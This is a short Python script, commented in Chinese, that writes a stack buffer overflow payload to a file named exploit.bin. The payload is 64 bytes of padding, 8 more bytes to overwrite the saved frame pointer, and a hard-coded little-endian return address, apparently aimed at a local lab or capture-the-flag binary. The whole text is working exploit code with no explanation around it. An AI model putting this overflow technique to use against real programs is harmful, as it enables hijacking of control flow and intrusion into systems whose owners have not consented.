address = 0x0000555555555189
payload_size = 64  # 根据缓冲区大小设置
padding = b'A' * payload_size + b'B' * 8  # 创建填充
address_bytes = address.to_bytes(8, byteorder='little')  # 将地址转换为小端字节序
print(address_bytes)
with open("exploit.bin", "wb") as f:
    f.write(padding)  # 写入填充
    f.write(address_bytes)  # 写入地址